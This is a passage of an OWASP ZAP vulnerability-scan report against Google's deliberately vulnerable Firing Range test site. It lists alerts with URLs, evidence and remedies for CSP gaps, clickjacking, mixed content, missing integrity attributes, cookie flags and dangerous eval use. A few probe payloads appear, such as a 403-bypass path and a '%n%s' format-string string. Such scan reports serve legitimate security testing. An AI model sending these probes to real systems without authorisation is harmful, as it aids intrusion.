Do not use the GET method for any request that triggers a state change.

Phase: Implementation
Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.

### Reference


* [ https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html ](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
* [ https://cwe.mitre.org/data/definitions/352.html ](https://cwe.mitre.org/data/definitions/352.html)


#### CWE Id: [ 352 ](https://cwe.mitre.org/data/definitions/352.html)


#### WASC Id: 9

#### Source ID: 1

### [ Bypassing 403 ](https://www.zaproxy.org/docs/alerts/40038/)



##### Medium (Medium)

### Description

Bypassing 403 endpoints may be possible, the scan rule sent a payload that caused the response to be accessible (status code 200).

* URL: https://public-firing-range.appspot.com/reflected/parameter/body/403%2520/
  * Method: `GET`
  * Parameter: ``
  * Attack: `/reflected/parameter/body/403%20/`
  * Evidence: ``
  * Other Info: `https://public-firing-range.appspot.com/reflected/parameter/body/403?q=a`

Instances: 1

### Solution



### Reference


* [ https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/ ](https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/)
* [ https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf ](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)
* [ https://www.contextis.com/en/blog/server-technologies-reverse-proxy-bypass ](https://www.contextis.com/en/blog/server-technologies-reverse-proxy-bypass)



#### Source ID: 1

### [ CSP: Wildcard Directive ](https://www.zaproxy.org/docs/alerts/10055/)



##### Medium (High)

### Description

Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks. Including (but not limited to) Cross Site Scripting (XSS), and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.

* URL: https://public-firing-range.appspot.com/clickjacking/clickjacking_csp_no_frame_ancestors
  * Method: `GET`
  * Parameter: `Content-Security-Policy`
  * Attack: ``
  * Evidence: `object-src 'none'; script-src 'strict-dynamic' 'nonce-{random}' 'unsafe-inline' 'unsafe-eval' https: http:; base-uri 'none'; https://www.google.com; report-uri https://csp.withgoogle.com/csp/inquisition/inquisitor`
  * Other Info: `The following directives either allow wildcard sources (or ancestors), are not defined, or are overly broadly defined: 
style-src, img-src, connect-src, frame-src, frame-ancestors, font-src, media-src, manifest-src, worker-src, form-action

The directive(s): frame-ancestors, form-action are among the directives that do not fallback to default-src, missing/excluding them is the same as allowing anything.`

Instances: 1

### Solution

Ensure that your web server, application server, load balancer, etc. is properly configured to set the Content-Security-Policy header.

### Reference


* [ https://www.w3.org/TR/CSP/ ](https://www.w3.org/TR/CSP/)
* [ https://caniuse.com/#search=content+security+policy ](https://caniuse.com/#search=content+security+policy)
* [ https://content-security-policy.com/ ](https://content-security-policy.com/)
* [ https://github.com/HtmlUnit/htmlunit-csp ](https://github.com/HtmlUnit/htmlunit-csp)
* [ https://developers.google.com/web/fundamentals/security/csp#policy_applies_to_a_wide_variety_of_resources ](https://developers.google.com/web/fundamentals/security/csp#policy_applies_to_a_wide_variety_of_resources)


#### CWE Id: [ 693 ](https://cwe.mitre.org/data/definitions/693.html)


#### WASC Id: 15

#### Source ID: 3

### [ CSP: script-src unsafe-eval ](https://www.zaproxy.org/docs/alerts/10055/)



##### Medium (High)

### Description

Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks. Including (but not limited to) Cross Site Scripting (XSS), and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.

* URL: https://public-firing-range.appspot.com/clickjacking/clickjacking_csp_no_frame_ancestors
  * Method: `GET`
  * Parameter: `Content-Security-Policy`
  * Attack: ``
  * Evidence: `object-src 'none'; script-src 'strict-dynamic' 'nonce-{random}' 'unsafe-inline' 'unsafe-eval' https: http:; base-uri 'none'; https://www.google.com; report-uri https://csp.withgoogle.com/csp/inquisition/inquisitor`
  * Other Info: `script-src includes unsafe-eval.`

Instances: 1

### Solution

Ensure that your web server, application server, load balancer, etc. is properly configured to set the Content-Security-Policy header.

### Reference


* [ https://www.w3.org/TR/CSP/ ](https://www.w3.org/TR/CSP/)
* [ https://caniuse.com/#search=content+security+policy ](https://caniuse.com/#search=content+security+policy)
* [ https://content-security-policy.com/ ](https://content-security-policy.com/)
* [ https://github.com/HtmlUnit/htmlunit-csp ](https://github.com/HtmlUnit/htmlunit-csp)
* [ https://developers.google.com/web/fundamentals/security/csp#policy_applies_to_a_wide_variety_of_resources ](https://developers.google.com/web/fundamentals/security/csp#policy_applies_to_a_wide_variety_of_resources)


#### CWE Id: [ 693 ](https://cwe.mitre.org/data/definitions/693.html)


#### WASC Id: 15

#### Source ID: 3

### [ CSP: style-src unsafe-inline ](https://www.zaproxy.org/docs/alerts/10055/)



##### Medium (High)

### Description

Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks. Including (but not limited to) Cross Site Scripting (XSS), and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.

* URL: https://public-firing-range.appspot.com/clickjacking/clickjacking_csp_no_frame_ancestors
  * Method: `GET`
  * Parameter: `Content-Security-Policy`
  * Attack: ``
  * Evidence: `object-src 'none'; script-src 'strict-dynamic' 'nonce-{random}' 'unsafe-inline' 'unsafe-eval' https: http:; base-uri 'none'; https://www.google.com; report-uri https://csp.withgoogle.com/csp/inquisition/inquisitor`
  * Other Info: `style-src includes unsafe-inline.`

Instances: 1

### Solution

Ensure that your web server, application server, load balancer, etc. is properly configured to set the Content-Security-Policy header.

### Reference


* [ https://www.w3.org/TR/CSP/ ](https://www.w3.org/TR/CSP/)
* [ https://caniuse.com/#search=content+security+policy ](https://caniuse.com/#search=content+security+policy)
* [ https://content-security-policy.com/ ](https://content-security-policy.com/)
* [ https://github.com/HtmlUnit/htmlunit-csp ](https://github.com/HtmlUnit/htmlunit-csp)
* [ https://developers.google.com/web/fundamentals/security/csp#policy_applies_to_a_wide_variety_of_resources ](https://developers.google.com/web/fundamentals/security/csp#policy_applies_to_a_wide_variety_of_resources)


#### CWE Id: [ 693 ](https://cwe.mitre.org/data/definitions/693.html)


#### WASC Id: 15

#### Source ID: 3

### [ Content Security Policy (CSP) Header Not Set ](https://www.zaproxy.org/docs/alerts/10038/)



##### Medium (High)

### Description

Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.

* URL: https://public-firing-range.appspot.com
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/address/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/badscriptimport/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/clickjacking/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/cors/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/robots.txt
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/sitemap.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``

Instances: 11

### Solution

Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header.

### Reference


* [ https://developer.mozilla.org/en-US/docs/Web/Security/CSP/Introducing_Content_Security_Policy ](https://developer.mozilla.org/en-US/docs/Web/Security/CSP/Introducing_Content_Security_Policy)
* [ https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html ](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
* [ https://www.w3.org/TR/CSP/ ](https://www.w3.org/TR/CSP/)
* [ https://w3c.github.io/webappsec-csp/ ](https://w3c.github.io/webappsec-csp/)
* [ https://web.dev/articles/csp ](https://web.dev/articles/csp)
* [ https://caniuse.com/#feat=contentsecuritypolicy ](https://caniuse.com/#feat=contentsecuritypolicy)
* [ https://content-security-policy.com/ ](https://content-security-policy.com/)


#### CWE Id: [ 693 ](https://cwe.mitre.org/data/definitions/693.html)


#### WASC Id: 15

#### Source ID: 3

### [ Format String Error ](https://www.zaproxy.org/docs/alerts/30002/)



##### Medium (Medium)

### Description

A Format String error occurs when the submitted data of an input string is evaluated as a command by the application. 

* URL: https://public-firing-range.appspot.com/flashinjection/callbackIsEchoedBack%3Fcallback=ZAP%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%250A
  * Method: `GET`
  * Parameter: `callback`
  * Attack: `ZAP%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s
`
  * Evidence: ``
  * Other Info: `Potential Format String Error.  The script closed the connection on a /%s`

Instances: 1

### Solution

Rewrite the background program using proper deletion of bad character strings.  This will require a recompile of the background executable.

### Reference


* [ https://owasp.org/www-community/attacks/Format_string_attack ](https://owasp.org/www-community/attacks/Format_string_attack)


#### CWE Id: [ 134 ](https://cwe.mitre.org/data/definitions/134.html)


#### WASC Id: 6

#### Source ID: 1

### [ Missing Anti-clickjacking Header ](https://www.zaproxy.org/docs/alerts/10020/)



##### Medium (Medium)

### Description

The response does not include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options to protect against 'ClickJacking' attacks.

* URL: https://public-firing-range.appspot.com
  * Method: `GET`
  * Parameter: `x-frame-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/
  * Method: `GET`
  * Parameter: `x-frame-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/address/index.html
  * Method: `GET`
  * Parameter: `x-frame-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/index.html
  * Method: `GET`
  * Parameter: `x-frame-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/badscriptimport/index.html
  * Method: `GET`
  * Parameter: `x-frame-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/clickjacking/index.html
  * Method: `GET`
  * Parameter: `x-frame-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/cors/index.html
  * Method: `GET`
  * Parameter: `x-frame-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/index.html
  * Method: `GET`
  * Parameter: `x-frame-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/flashinjection/index.html
  * Method: `GET`
  * Parameter: `x-frame-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/index.html
  * Method: `GET`
  * Parameter: `x-frame-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/mixedcontent/index.html
  * Method: `GET`
  * Parameter: `x-frame-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``

Instances: 11

### Solution

Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.
If you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. Alternatively consider implementing Content Security Policy's "frame-ancestors" directive.

### Reference


* [ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)


#### CWE Id: [ 1021 ](https://cwe.mitre.org/data/definitions/1021.html)


#### WASC Id: 15

#### Source ID: 3

### [ Secure Pages Include Mixed Content (Including Scripts) ](https://www.zaproxy.org/docs/alerts/10040/)



##### Medium (Medium)

### Description

The page includes mixed content, that is content accessed via HTTP instead of HTTPS.

* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_script%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://irrelevant.google.com?a`
  * Other Info: `tag=script src=http://irrelevant.google.com?a
`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_script%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://irrelevant.google.com?a`
  * Other Info: `tag=script src=http://irrelevant.google.com?a
`
* URL: https://public-firing-range.appspot.com/mixedcontent/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/mixedcontent/script.js`
  * Other Info: `tag=script src=http://public-firing-range.appspot.com/mixedcontent/script.js
`
* URL: https://public-firing-range.appspot.com/reflected/parameter/attribute_script%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://irrelevant.google.com/a`
  * Other Info: `tag=script src=http://irrelevant.google.com/a
`
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=http://127.0.0.2/localhost_import.js
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://127.0.0.2/localhost_import.js`
  * Other Info: `tag=script src=http://127.0.0.2/localhost_import.js
`
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=http://192.168.1.2/private_network_import.js
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://192.168.1.2/private_network_import.js`
  * Other Info: `tag=script src=http://192.168.1.2/private_network_import.js
`
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=http://g00gle.com/typosquatting_domain.js
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://g00gle.com/typosquatting_domain.js`
  * Other Info: `tag=script src=http://g00gle.com/typosquatting_domain.js
`

Instances: 7

### Solution

A page that is available over SSL/TLS must be comprised completely of content which is transmitted over SSL/TLS.
The page must not contain any content that is transmitted over unencrypted HTTP.
 This includes content from third party sites.

### Reference


* [ https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html ](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)


#### CWE Id: [ 311 ](https://cwe.mitre.org/data/definitions/311.html)


#### WASC Id: 4

#### Source ID: 3

### [ Sub Resource Integrity Attribute Missing ](https://www.zaproxy.org/docs/alerts/90003/)



##### Medium (High)

### Description

The integrity attribute is missing on a script or link tag served by an external server. The integrity tag prevents an attacker who have gained access to this server from injecting a malicious content. 

* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_script%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="http://irrelevant.google.com?a"/>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_script%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="http://irrelevant.google.com?a"/>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/attribute_script%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="http://irrelevant.google.com/a"/>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=http://127.0.0.2/localhost_import.js
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="http://127.0.0.2/localhost_import.js"></script>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=http://192.168.1.2/private_network_import.js
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="http://192.168.1.2/private_network_import.js"></script>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=http://g00gle.com/typosquatting_domain.js
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="http://g00gle.com/typosquatting_domain.js"></script>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=https://google.com
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="https://google.com"></script>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/vulnerablelibraries/jquery.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `<script src="https://code.jquery.com/jquery-1.8.1.js"></script>`
  * Other Info: ``

Instances: 8

### Solution

Provide a valid integrity attribute to the tag.

### Reference


* [ https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity ](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)


#### CWE Id: [ 345 ](https://cwe.mitre.org/data/definitions/345.html)


#### WASC Id: 15

#### Source ID: 3

### [ Application Error Disclosure ](https://www.zaproxy.org/docs/alerts/90022/)



##### Low (Medium)

### Description

This page contains an error/warning message that may disclose sensitive information like the location of the file that produced the unhandled exception. This information can be used to launch further attacks against the web application. The alert could be a false positive if the error message is found inside a documentation page.

* URL: https://public-firing-range.appspot.com/reflected/parameter/body/500%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 500 Internal Server Error`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/url/a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 500 Internal Server Error`
  * Other Info: ``

Instances: 2

### Solution

Review the source code of this page. Implement custom error pages. Consider implementing a mechanism to provide a unique error reference/identifier to the client (browser) while logging the details on the server side and not exposing them to the user.

### Reference



#### CWE Id: [ 200 ](https://cwe.mitre.org/data/definitions/200.html)


#### WASC Id: 13

#### Source ID: 3

### [ CSP: Notices ](https://www.zaproxy.org/docs/alerts/10055/)



##### Low (High)

### Description

Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks. Including (but not limited to) Cross Site Scripting (XSS), and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.

* URL: https://public-firing-range.appspot.com/clickjacking/clickjacking_csp_no_frame_ancestors
  * Method: `GET`
  * Parameter: `Content-Security-Policy`
  * Attack: ``
  * Evidence: `object-src 'none'; script-src 'strict-dynamic' 'nonce-{random}' 'unsafe-inline' 'unsafe-eval' https: http:; base-uri 'none'; https://www.google.com; report-uri https://csp.withgoogle.com/csp/inquisition/inquisitor`
  * Other Info: `Errors:
Directive name https://www.google.com contains characters outside the range ALPHA / DIGIT / "-"
Warnings:
The report-uri directive has been deprecated in favor of the new report-to directive
`

Instances: 1

### Solution

Ensure that your web server, application server, load balancer, etc. is properly configured to set the Content-Security-Policy header.

### Reference


* [ https://www.w3.org/TR/CSP/ ](https://www.w3.org/TR/CSP/)
* [ https://caniuse.com/#search=content+security+policy ](https://caniuse.com/#search=content+security+policy)
* [ https://content-security-policy.com/ ](https://content-security-policy.com/)
* [ https://github.com/HtmlUnit/htmlunit-csp ](https://github.com/HtmlUnit/htmlunit-csp)
* [ https://developers.google.com/web/fundamentals/security/csp#policy_applies_to_a_wide_variety_of_resources ](https://developers.google.com/web/fundamentals/security/csp#policy_applies_to_a_wide_variety_of_resources)


#### CWE Id: [ 693 ](https://cwe.mitre.org/data/definitions/693.html)


#### WASC Id: 15

#### Source ID: 3

### [ Cookie Without Secure Flag ](https://www.zaproxy.org/docs/alerts/10011/)



##### Low (Medium)

### Description

A cookie has been set without the secure flag, which means that the cookie can be accessed via unencrypted connections.

* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie
  * Method: `GET`
  * Parameter: `my_secret_cookie`
  * Attack: ``
  * Evidence: `Set-Cookie: my_secret_cookie`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedinresource
  * Method: `GET`
  * Parameter: `my_secret_cookie`
  * Attack: ``
  * Evidence: `Set-Cookie: my_secret_cookie`
  * Other Info: ``

Instances: 2

### Solution

Whenever a cookie contains sensitive information or is a session token, then it should always be passed using an encrypted channel. Ensure that the secure flag is set for cookies containing such sensitive information.

### Reference


* [ https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.html ](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.html)


#### CWE Id: [ 614 ](https://cwe.mitre.org/data/definitions/614.html)


#### WASC Id: 13

#### Source ID: 3

### [ Cookie without SameSite Attribute ](https://www.zaproxy.org/docs/alerts/10054/)



##### Low (Medium)

### Description

A cookie has been set without the SameSite attribute, which means that the cookie can be sent as a result of a 'cross-site' request. The SameSite attribute is an effective counter measure to cross-site request forgery, cross-site script inclusion, and timing attacks.

* URL: https://public-firing-range.appspot.com/leakedcookie/leakedcookie
  * Method: `GET`
  * Parameter: `my_secret_cookie`
  * Attack: ``
  * Evidence: `Set-Cookie: my_secret_cookie`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/leakedinresource
  * Method: `GET`
  * Parameter: `my_secret_cookie`
  * Attack: ``
  * Evidence: `Set-Cookie: my_secret_cookie`
  * Other Info: ``

Instances: 2

### Solution

Ensure that the SameSite attribute is set to either 'lax' or ideally 'strict' for all cookies.

### Reference


* [ https://tools.ietf.org/html/draft-ietf-httpbis-cookie-same-site ](https://tools.ietf.org/html/draft-ietf-httpbis-cookie-same-site)


#### CWE Id: [ 1275 ](https://cwe.mitre.org/data/definitions/1275.html)


#### WASC Id: 13

#### Source ID: 3

### [ Cross-Domain JavaScript Source File Inclusion ](https://www.zaproxy.org/docs/alerts/10017/)



##### Low (Medium)

### Description

The page includes one or more script files from a third-party domain.

* URL: https://public-firing-range.appspot.com/angular/angular_body/1.1.5%3Fq=test
  * Method: `GET`
  * Parameter: `//ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.js`
  * Attack: ``
  * Evidence: `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.js"></script>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/angular_body/1.2.0%3Fq=test
  * Method: `GET`
  * Parameter: `//ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.js`
  * Attack: ``
  * Evidence: `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.js"></script>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/angular_body/1.2.18%3Fq=test
  * Method: `GET`
  * Parameter: `//ajax.googleapis.com/ajax/libs/angularjs/1.2.18/angular.js`
  * Attack: ``
  * Evidence: `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.18/angular.js"></script>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/angular_body/1.2.19%3Fq=test
  * Method: `GET`
  * Parameter: `//ajax.googleapis.com/ajax/libs/angularjs/1.2.19/angular.js`
  * Attack: ``
  * Evidence: `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.19/angular.js"></script>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/angular_body/1.2.24%3Fq=test
  * Method: `GET`
  * Parameter: `//ajax.googleapis.com/ajax/libs/angularjs/1.2.24/angular.js`
  * Attack: ``
  * Evidence: `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.24/angular.js"></script>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/angular_body/1.4.0%3Fq=test
  * Method: `GET`
  * Parameter: `//ajax.googleapis.com/ajax/libs/angularjs/1.4.0/angular.js`
  * Attack: ``
  * Evidence: `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.4.0/angular.js"></script>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/angular_body_alt_symbols_raw/1.6.0%3Fq=test
  * Method: `GET`
  * Parameter: `//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.js`
  * Attack: ``
  * Evidence: `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.js"></script>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/angular_body_raw_escaped_alt_symbols/1.4.0%3Fq=test
  * Method: `GET`
  * Parameter: `//ajax.googleapis.com/ajax/libs/angularjs/1.4.0/angular.js`
  * Attack: ``
  * Evidence: `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.4.0/angular.js"></script>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/angular_body_raw_post/1.6.0
  * Method: `GET`
  * Parameter: `//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.js`
  * Attack: ``
  * Evidence: `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.js"></script>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=http://127.0.0.2/localhost_import.js
  * Method: `GET`
  * Parameter: `http://127.0.0.2/localhost_import.js`
  * Attack: ``
  * Evidence: `<script src="http://127.0.0.2/localhost_import.js"></script>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=http://192.168.1.2/private_network_import.js
  * Method: `GET`
  * Parameter: `http://192.168.1.2/private_network_import.js`
  * Attack: ``
  * Evidence: `<script src="http://192.168.1.2/private_network_import.js"></script>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=http://g00gle.com/typosquatting_domain.js
  * Method: `GET`
  * Parameter: `http://g00gle.com/typosquatting_domain.js`
  * Attack: ``
  * Evidence: `<script src="http://g00gle.com/typosquatting_domain.js"></script>`
  * Other Info: ``

Instances: 12

### Solution

Ensure JavaScript source files are loaded from only trusted sources, and the sources can't be controlled by end users of the application.

### Reference



#### CWE Id: [ 829 ](https://cwe.mitre.org/data/definitions/829.html)


#### WASC Id: 15

#### Source ID: 3

### [ Dangerous JS Functions ](https://www.zaproxy.org/docs/alerts/10110/)



##### Low (Low)

### Description

A dangerous JS function seems to be in use that would leave the site vulnerable.

* URL: https://public-firing-range.appspot.com/address/location.hash/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `eval`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/address/location/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `eval`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/dom/toxicdom/document/cookie/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `eval`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/dom/toxicdom/document/cookie_set/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `eval`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/dom/toxicdom/document/referrer/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `eval`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/function/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `eval`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/dom/toxicdom/localStorage/array/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `eval`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/dom/toxicdom/localStorage/function/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `eval`
